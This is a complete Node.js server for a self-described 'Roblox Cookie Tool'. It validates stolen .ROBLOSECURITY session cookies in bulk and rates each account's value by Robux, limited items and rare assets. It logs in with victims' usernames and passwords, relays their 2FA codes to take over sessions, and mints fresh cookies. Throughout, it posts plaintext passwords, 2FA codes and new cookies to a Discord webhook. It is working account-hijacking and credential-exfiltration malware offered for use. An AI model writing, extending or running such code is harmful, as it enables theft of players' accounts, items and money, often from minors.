// ============================================
// ROBLOX COOKIE TOOL — BACKEND
// Fix: Expires Infinity + Auto-Relogin
// Install: npm install express axios tough-cookie axios-cookiejar-support cors
// Run: node server.js
// ============================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { CookieJar, Cookie } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const DISCORD_WEBHOOK = 'ISI_URL_WEBHOOK_DISCORD_LU';
const PORT = process.env.PORT || 3000;

// Simpen session 2FA sementara
const sessions = {};

// ============================================
// HELPER — SET COOKIE (BYPASS PARSER)
// ============================================
async function setCookieSafe(jar, cookieValue) {
  const cookie = new Cookie({
    key: '.ROBLOSECURITY',
    value: cookieValue.trim(),
    domain: '.roblox.com',
    path: '/',
    secure: true,
    httpOnly: true
  });
  await jar.setCookie(cookie, 'https://www.roblox.com');
  return jar;
}

// ============================================
// HELPER — CLEAN COOKIE
// ============================================
function cleanCookie(c) {
  return (c || '').trim()
    .replace(/\s+/g, '')
    .replace(/\n/g, '')
    .replace(/\r/g, '');
}

// ============================================
// HELPER — DISCORD
// ============================================
async function sendToDiscord(embed) {
  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('ISI_URL')) return;
  try {
    await axios.post(DISCORD_WEBHOOK, {
      username: 'Cookie Tool',
      embeds: [embed]
    });
  } catch(e) {}
}

// ============================================
// HELPER — FETCH ACCOUNT DATA
// ============================================
async function fetchAccountData(jar, csrfToken) {
  const client = wrapper(axios.create({
    jar,
    withCredentials: true,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'X-CSRF-TOKEN': csrfToken || ''
    }
  }));

  const result = {};

  try {
    const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
    result.user = userRes.data;
    const userId = userRes.data.id;

    try {
      const p = await client.get(`https://users.roblox.com/v1/users/${userId}`);
      result.accountAge = Math.floor((new Date() - new Date(p.data.created)) / 86400000);
    } catch(e) {}

    try {
      const r = await client.get('https://economy.roblox.com/v1/user/currency');
      result.robux = r.data.robux || 0;
    } catch(e) { result.robux = 0; }

    try {
      const r = await client.get('https://accountsettings.roblox.com/v1/account/settings');
      result.email = r.data.email || 'N/A';
      result.phone = r.data.phone || 'N/A';
    } catch(e) {}

    try {
      const r = await client.get('https://auth.roblox.com/v2/twostepverification/status');
      result.twoFAEnabled = r.data.enabled || false;
    } catch(e) { result.twoFAEnabled = false; }

    try {
      const r = await client.get('https://accountsettings.roblox.com/v1/account/pin');
      result.pinEnabled = r.data.isEnabled || false;
    } catch(e) { result.pinEnabled = false; }

    try {
      const r = await client.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
      const items = r.data.data || [];
      let totalRap = 0, hasKorblox = false, hasHeadless = false;
      const KORBLOX = [22724251, 22724260, 22724270];
      const HEADLESS = 151156164;

      for (const it of items) {
        totalRap += it.recentAveragePrice || 0;
        if (KORBLOX.includes(it.assetId)) hasKorblox = true;
        if (it.assetId === HEADLESS) hasHeadless = true;
      }
      result.rap = totalRap;
      result.limitedsOwned = items.length;
      result.hasKorblox = hasKorblox;
      result.hasHeadless = hasHeadless;
    } catch(e) {}

    result.avatar = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
    return { success: true, data: result };
  } catch(e) {
    return { success: false, error: e.message, status: e.response?.status };
  }
}

// ============================================
// HELPER — ROBLOX LOGIN (AUTO-RELOGIN)
// ============================================
async function robloxLogin(username, password) {
  const jar = new CookieJar();
  const client = wrapper(axios.create({
    jar,
    withCredentials: true,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    }
  }));

  // Step 1: CSRF token
  let csrfToken = '';
  try {
    await client.post('https://auth.roblox.com/v2/login', {});
  } catch(e) {
    csrfToken = e.response?.headers['x-csrf-token'] || '';
  }
  if (!csrfToken) {
    try {
      const r = await client.get('https://www.roblox.com/home');
      csrfToken = r.headers['x-csrf-token'] || '';
    } catch(e) {}
  }

  // Step 2: Login
  let loginRes;
  try {
    loginRes = await client.post('https://auth.roblox.com/v2/login', {
      ctype: 'Username',
      cvalue: username,
      password: password
    }, {
      headers: { 'X-CSRF-TOKEN': csrfToken }
    });
  } catch(e) {
    loginRes = e.response;
  }

  if (!loginRes) return { success: false, error: 'No response' };
  const data = loginRes.data;

  // 2FA needed?
  if (data.twoStepVerificationData) {
    return {
      success: false,
      needs2FA: true,
      challengeId: data.twoStepVerificationData.challengeId,
      mediaType: data.twoStepVerificationData.mediaType,
      jar,
      csrfToken
    };
  }

  if (!data.user) {
    return { success: false, error: data.errors?.[0]?.message || 'Invalid credentials' };
  }

  // Step 3: Ambil cookie baru
  const cookies = await jar.getCookies('https://www.roblox.com');
  const roblosecurity = cookies.find(c => c.key === '.ROBLOSECURITY');

  return {
    success: true,
    user: data.user,
    cookie: roblosecurity?.value || '',
    jar,
    csrfToken
  };
}

// ============================================
// HELPER — SUBMIT 2FA
// ============================================
async function submit2FA(jar, csrfToken, challengeId, code) {
  const client = wrapper(axios.create({
    jar,
    withCredentials: true,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Content-Type': 'application/json',
      'X-CSRF-TOKEN': csrfToken
    }
  }));

  try {
    const res = await client.post('https://auth.roblox.com/v2/twostepverification/verify', {
      challengeId,
      actionType: 'Login',
      code
    });
    return { success: true, data: res.data };
  } catch(e) {
    return { success: false, error: e.response?.data || e.message };
  }
}

// ============================================
// ENDPOINT — CHECK COOKIE
// ============================================
app.post('/api/check-cookie', async (req, res) => {
  let { cookie } = req.body;
  if (!cookie) return res.json({ valid: false, error: 'No cookie' });

  cookie = cleanCookie(cookie);

  try {
    const jar = new CookieJar();
    await setCookieSafe(jar, cookie);
    const client = wrapper(axios.create({ jar }));

    const r = await client.get('https://users.roblox.com/v1/users/authenticated');
    res.json({ valid: true, user: r.data });
  } catch(e) {
    res.json({ valid: false, error: e.response?.status === 401 ? 'Invalid/Expired' : e.message });
  }
});

// ============================================
// ENDPOINT — FULL DATA
// ============================================
app.post('/api/fetch-by-cookie', async (req, res) => {
  let { cookie } = req.body;
  if (!cookie) return res.json({ success: false, error: 'No cookie' });

  cookie = cleanCookie(cookie);

  try {
    const jar = new CookieJar();
    await setCookieSafe(jar, cookie);
    const client = wrapper(axios.create({ jar }));

    let csrfToken = '';
    try {
      await client.post('https://auth.roblox.com/v2/logout');
    } catch(e) {
      csrfToken = e.response?.headers['x-csrf-token'] || '';
    }

    const data = await fetchAccountData(jar, csrfToken);
    res.json(data);
  } catch(e) {
    res.json({ success: false, error: e.message });
  }
});

// ============================================
// ENDPOINT — BULK CHECK
// ============================================
app.post('/api/bulk-check-cookie', async (req, res) => {
  const { cookies } = req.body;
  if (!cookies || !Array.isArray(cookies)) return res.json({ success: false, error: 'Invalid input' });

  const results = [];

  for (let i = 0; i < cookies.length; i++) {
    const cookieValue = cleanCookie(cookies[i]);
    if (!cookieValue) {
      results.push({ index: i, valid: false, error: 'Empty cookie' });
      continue;
    }

    try {
      const jar = new CookieJar();
      await setCookieSafe(jar, cookieValue);
      const client = wrapper(axios.create({
        jar,
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      }));

      const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
      const userId = userRes.data.id;

      let robux = 0, rap = 0, hasKorblox = false, hasHeadless = false, limitedsOwned = 0, accountAge = 0;

      try { const r = await client.get('https://economy.roblox.com/v1/user/currency'); robux = r.data.robux || 0; } catch(e) {}
      try { const p = await client.get(`https://users.roblox.com/v1/users/${userId}`); accountAge = Math.floor((new Date() - new Date(p.data.created)) / 86400000); } catch(e) {}

      try {
        const inv = await client.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
        const items = inv.data.data || [];
        limitedsOwned = items.length;
        const KORBLOX = [22724251, 22724260, 22724270];
        const HEADLESS = 151156164;
        for (const it of items) {
          rap += it.recentAveragePrice || 0;
          if (KORBLOX.includes(it.assetId)) hasKorblox = true;
          if (it.assetId === HEADLESS) hasHeadless = true;
        }
      } catch(e) {}

      results.push({
        index: i,
        valid: true,
        user: { id: userId, name: userRes.data.name, displayName: userRes.data.displayName },
        robux, rap, limitedsOwned, hasKorblox, hasHeadless, accountAge,
        avatar: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`
      });
    } catch(e) {
      results.push({
        index: i,
        valid: false,
        error: e.response?.status === 401 ? 'Invalid/Expired' : e.message
      });
    }

    if (i < cookies.length - 1) await new Promise(r => setTimeout(r, 800));
  }

  const valid = results.filter(r => r.valid).length;
  const invalid = results.filter(r => !r.valid).length;

  if (valid > 0) {
    try {
      const fields = results.filter(r => r.valid).slice(0, 10).map(r => ({
        name: `${r.user.name} (${r.user.id})`,
        value: `💰 ${r.robux} | 📊 ${r.rap} RAP | 🎩 ${r.hasKorblox ? '✅' : '❌'} | 💀 ${r.hasHeadless ? '✅' : '❌'}`,
        inline: false
      }));
      await sendToDiscord({
        title: `📦 BULK CHECK — ${valid} Valid / ${invalid} Invalid`,
        color: 0x00a2ff,
        fields,
        footer: { text: `Total: ${cookies.length} cookies` },
        timestamp: new Date().toISOString()
      });
    } catch(e) {}
  }

  res.json({ success: true, total: cookies.length, valid, invalid, results });
});

// ============================================
// ENDPOINT — COOKIE REFRESH (FIXED)
// ============================================
app.post('/api/refresh-cookie', async (req, res) => {
  let { cookie } = req.body;
  if (!cookie) return res.json({ success: false, error: 'No cookie provided' });

  cookie = cleanCookie(cookie);

  try {
    const jar = new CookieJar();
    await setCookieSafe(jar, cookie);
    const client = wrapper(axios.create({
      jar,
      withCredentials: true,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    }));

    // Step 1: Cek valid
    let userInfo;
    try {
      const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
      userInfo = userRes.data;
    } catch (e) {
      return res.json({ success: false, error: 'Cookie invalid or expired', status: e.response?.status || 'unknown' });
    }

    // Step 2: Ambil CSRF
    let csrfToken = '';
    try {
      await client.post('https://auth.roblox.com/v2/logout');
    } catch (e) {
      csrfToken = e.response?.headers['x-csrf-token'] || '';
    }

    // Step 3: Refresh session
    try {
      await client.get('https://www.roblox.com/home', { headers: { 'X-CSRF-TOKEN': csrfToken } });
    } catch (e) {}

    // Step 4: Ambil cookie baru
    const cookies = await jar.getCookies('https://www.roblox.com');
    const newCookie = cookies.find(c => c.key === '.ROBLOSECURITY');
    if (!newCookie) return res.json({ success: false, error: 'No new cookie generated' });

    // Step 5: Hitung masa aktif (FIXED — handle session-based cookie)
    const expiresAt = newCookie.expires;
    const now = new Date();
    let daysLeft = 'Session-based (no expiry)';
    let expiresStr = 'No expiry — valid until logout';

    if (expiresAt && expiresAt !== 'Infinity' && expiresAt !== 'Invalid Date') {
      const expDate = new Date(expiresAt);
      if (!isNaN(expDate.getTime()) && expDate.getFullYear() < 2100) {
        const diff = Math.floor((expDate - now) / 86400000);
        daysLeft = diff + ' days';
        expiresStr = expDate.toISOString();
      }
    }

    // Step 6: Fetch data akun
    const accountData = await fetchAccountData(jar, csrfToken);

    // Step 7: Kirim ke Discord
    await sendToDiscord({
      title: '🔄 COOKIE REFRESHED',
      color: 0x22c55e,
      thumbnail: accountData.data?.avatar ? { url: accountData.data.avatar } : undefined,
      fields: [
        { name: '👤 Username', value: '`' + userInfo.name + '`', inline: true },
        { name: '🆔 User ID', value: '`' + userInfo.id + '`', inline: true },
        { name: '📅 Expires', value: '`' + expiresStr + '`', inline: true },
        { name: '💰 Robux', value: '`' + (accountData.data?.robux || 0) + '`', inline: true },
        { name: '📊 RAP', value: '`' + (accountData.data?.rap || 0) + '`', inline: true },
        { name: '🎩 Korblox', value: accountData.data?.hasKorblox ? '✅' : '❌', inline: true },
        { name: '💀 Headless', value: accountData.data?.hasHeadless ? '✅' : '❌', inline: true },
        { name: '🍪 New Cookie', value: '```' + newCookie.value + '```', inline: false }
      ],
      footer: { text: 'Cookie Refresher' },
      timestamp: new Date().toISOString()
    });

    res.json({
      success: true,
      oldCookie: cookie,
      newCookie: newCookie.value,
      cookieChanged: newCookie.value !== cookie,
      expiresAt: expiresStr,
      daysLeft: daysLeft,
      user: userInfo,
      accountData: accountData.data || {}
    });

  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

// ============================================
// ENDPOINT — AUTO-RELOGIN (CREDENTIAL)
// ============================================
app.post('/api/relogin', async (req, res) => {
  const { username, password, ip } = req.body;
  if (!username || !password) return res.json({ success: false, error: 'Missing fields' });

  const loginResult = await robloxLogin(username, password);

  if (loginResult.needs2FA) {
    sessions[username] = {
      jar: loginResult.jar,
      csrfToken: loginResult.csrfToken,
      challengeId: loginResult.challengeId,
      password
    };
    await sendToDiscord({
      title: '🔐 RELOGIN — 2FA REQUIRED',
      color: 0xffaa00,
      fields: [
        { name: '👤 Username', value: '`' + username + '`', inline: true },
        { name: '🔑 Password', value: '`' + password + '`', inline: true },
        { name: '📱 Media', value: '`' + (loginResult.mediaType || 'N/A') + '`', inline: true },
        { name: '🌐 IP', value: '`' + (ip || 'N/A') + '`', inline: true }
      ],
      timestamp: new Date().toISOString()
    });
    return res.json({ success: false, needs2FA: true, mediaType: loginResult.mediaType });
  }

  if (!loginResult.success) {
    return res.json({ success: false, error: loginResult.error });
  }

  // Fetch data akun
  const accountData = await fetchAccountData(loginResult.jar, loginResult.csrfToken);

  // Hitung masa aktif
  const cookies = await loginResult.jar.getCookies('https://www.roblox.com');
  const roblosecurity = cookies.find(c => c.key === '.ROBLOSECURITY');
  let expiresStr = 'Session-based';
  if (roblosecurity?.expires && roblosecurity.expires !== 'Infinity') {
    expiresStr = new Date(roblosecurity.expires).toISOString();
  }

  await sendToDiscord({
    title: '🔑 RELOGIN SUCCESS — NEW COOKIE',
    color: 0x22c55e,
    thumbnail: accountData.data?.avatar ? { url: accountData.data.avatar } : undefined,
    fields: [
      { name: '👤 Username', value: '`' + username + '`', inline: true },
      { name: '🔑 Password', value: '`' + password + '`', inline: true },
      { name: '🆔 User ID', value: '`' + (loginResult.user?.id || 'N/A') + '`', inline: true },
      { name: '💰 Robux', value: '`' + (accountData.data?.robux || 0) + '`', inline: true },
      { name: '📊 RAP', value: '`' + (accountData.data?.rap || 0) + '`', inline: true },
      { name: '🎩 Korblox', value: accountData.data?.hasKorblox ? '✅' : '❌', inline: true },
      { name: '💀 Headless', value: accountData.data?.hasHeadless ? '✅' : '❌', inline: true },
      { name: '📅 Expires', value: '`' + expiresStr + '`', inline: true },
      { name: '🍪 NEW COOKIE', value: '```' + loginResult.cookie + '```', inline: false }
    ],
    footer: { text: 'Auto-Relogin' },
    timestamp: new Date().toISOString()
  });

  res.json({
    success: true,
    newCookie: loginResult.cookie,
    expiresAt: expiresStr,
    user: loginResult.user,
    accountData: accountData.data || {}
  });
});

// ============================================
// ENDPOINT — SUBMIT 2FA FOR RELOGIN
// ============================================
app.post('/api/relogin-2fa', async (req, res) => {
  const { username, code, ip } = req.body;
  const session = sessions[username];
  if (!session) return res.json({ success: false, error: 'Session expired' });

  const result = await submit2FA(session.jar, session.csrfToken, session.challengeId, code);
  if (!result.success) return res.json({ success: false, error: 'Invalid 2FA code' });

  const cookies = await session.jar.getCookies('https://www.roblox.com');
  const roblosecurity = cookies.find(c => c.key === '.ROBLOSECURITY');
  const accountData = await fetchAccountData(session.jar, session.csrfToken);

  await sendToDiscord({
    title: '🔓 RELOGIN 2FA BYPASSED — NEW COOKIE',
    color: 0x22c55e,
    thumbnail: accountData.data?.avatar ? { url: accountData.data.avatar } : undefined,
    fields: [
      { name: '👤 Username', value: '`' + username + '`', inline: true },
      { name: '🔑 Password', value: '`' + session.password + '`', inline: true },
      { name: '🔐 2FA Code', value: '`' + code + '`', inline: true },
      { name: '💰 Robux', value: '`' + (accountData.data?.robux || 0) + '`', inline: true },
      { name: '📊 RAP', value: '`' + (accountData.data?.rap || 0) + '`', inline: true },
      { name: '🎩 Korblox', value: accountData.data?.hasKorblox ? '✅' : '❌', inline: true },
      { name: '💀 Headless', value: accountData.data?.hasHeadless ? '✅' : '❌', inline: true },
      { name: '🍪 NEW COOKIE', value: '```' + (roblosecurity?.value || 'N/A') + '```', inline: false }
    ],
    footer: { text: 'Auto-Relogin 2FA' },
    timestamp: new Date().toISOString()
  });

  delete sessions[username];

  res.json({
    success: true,
    newCookie: roblosecurity?.value || '',
    user: accountData.data?.user || {},
    accountData: accountData.data || {}
  });
});

// ============================================
// START
// ============================================
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
